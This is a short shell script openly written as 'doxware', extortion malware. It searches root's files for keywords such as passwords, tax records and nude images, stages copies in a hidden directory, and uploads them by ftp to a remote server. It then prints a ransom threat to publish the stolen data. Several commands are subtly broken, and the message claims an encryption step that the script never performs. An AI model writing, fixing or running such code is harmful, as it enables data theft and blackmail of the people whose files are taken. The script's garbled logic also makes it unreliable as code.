#!/bin/sh

function scan {
    # Scans for sensitive keywords in home directories
    for dir in /root/*; do
        grep -q "confidential|tax|password|nude" "$dir" && echo "$dir contains sensitive data!"
        touch $dir.temp
    done
}

function copy {
    # Copies identified files into a hidden temporary directory
    for file in $(find /root/ -type f); do
        if [[ ! -f "${file}.temp" ]]; then
            cp "$file" "/root/.doxware/${file%.*/}"
        fi
    done
}

function exfiltrate {
    # Compresses and uploads staged files to a remote server
    for file in $(ls /root/.doxware); do
        zcat $file | ftp -u username password server.com:/path/to/remote/directory/$file
        rm -rf /root/.doxware/$file
    done
}

function notify {
    # Displays message threatening to publish specific stolen files
    echo "Your sensitive data has been encrypted and will be published unless you pay a ransom!"
}

function main {
    scan
    copy
    exfiltrate
    notify
}

main
